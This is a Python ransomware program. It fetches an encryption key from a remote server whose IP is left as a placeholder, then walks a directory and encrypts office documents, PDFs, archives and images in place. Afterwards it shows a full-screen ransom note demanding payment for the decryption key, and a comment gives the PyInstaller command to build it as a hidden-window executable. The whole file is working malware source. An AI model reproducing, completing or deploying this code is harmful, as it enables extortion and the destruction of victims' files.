import os
from cryptography.fernet import Fernet
import tkinter as tk
import socket
from tkinter import *
from tkinter import messagebox

#python -m PyInstaller --onefile -w encrypt.py

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP_ADDRESS = 'SERVER IP HERE'
PORT = 9090
client_socket.connect((IP_ADDRESS, PORT))
key = client_socket.recv(1024)


class ransomware:
    EXCLUDED_DIRECTORIES = ('Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            #'paths',
            )
    
    EXTENSIONS = (
            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
    )
    
    def find_files(self):
        file_paths = []
        directory = r'TEST\DIRECTORY\HERE'
        #f = open("paths/path.txt","w")
        for root, dirs, files in os.walk(directory):
            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        file_paths.append(TARGET)
                        #f.write(TARGET+'\n')
                        print(root)
        #f.close()
        return file_paths
                        
    
    def encrypt_files(self, filename):
        fernet = Fernet(key)
        with open(filename, "rb") as file:
            file_content = file.read()
        encrypted_content = fernet.encrypt(file_content)
        with open(filename, "wb") as file:
            file.write(encrypted_content)
        print(filename)



ransomware = ransomware()   
file_paths = ransomware.find_files()


def decryption_screen():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    gap = (screen_height/50)
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="black")
    labe1 = tk.Label(root, text="YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED")
    labe1.config(font=('tohoma', int(gap)))
    labe1.config(background='black',foreground='red')
    labe1.pack(anchor='n', ipady=20)

    img = tk.PhotoImage(file="icon-red-lock.png")
    img = img.subsample(4)
    labe2 = tk.Label(root, image=img)
    labe2.pack(anchor='n', ipady=20)

    labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
    labe3.config(font=('tahoma', int(gap)))
    labe3.config(background="black", foreground="red")
    labe3.pack(anchor='n', ipady=20)

    labe4 = tk.Label(root, text="You will recieve the key once you have paid the ransom.\nInput the key below:")
    labe4.config(font=('tahoma',int(gap)))
    labe4.config(background='black',foreground='red')
    labe4.pack(anchor='n', ipady=20)
    
    def decrypt_files():
        try:
            user_input = entry.get()
            if user_input != key.decode():
                raise ValueError("Incorrect key")
        except ValueError as e:
            messagebox.showerror("Error", e)

        def decrypt_file(filename):
            fernet = Fernet(key)
            with open(filename, "rb") as file:
                file_content = file.read()
            decrypted_content = fernet.decrypt(file_content)
            with open(filename, "wb") as file:
                file.write(decrypted_content)
            print(filename)

        for file in file_paths:
            decrypt_file(file)
        messagebox.showinfo("Success", "Your Files have been decrypted!")
        root.destroy()

    entry = tk.Entry(root, width=int(screen_width/10))
    entry.pack(anchor='n', ipady=20)

    canvas1 = tk.Canvas(root, bg='black', highlightthickness=0, height=20, width=screen_width)
    canvas1.pack()

    key_submit = tk.Button(root, text='Submit', command=decrypt_files)
    key_submit.pack(anchor='n')

    root.mainloop()


def ransom():
    #filepath = 'paths/path.txt'
    for file in file_paths:
        current_file = file.strip()
        ransomware.encrypt_files(current_file)

#    with open(filepath) as file:
#        line = file.readline()
#       while line:
#           filename = line.strip()
#           ransomware.encrypt_files(filename)
#           line = file.readline()
#        file.close()


if __name__ == '__main__':
    #if path.exists("paths") is False:
    #    os.mkdir("paths")
    ransom()
    decryption_screen()
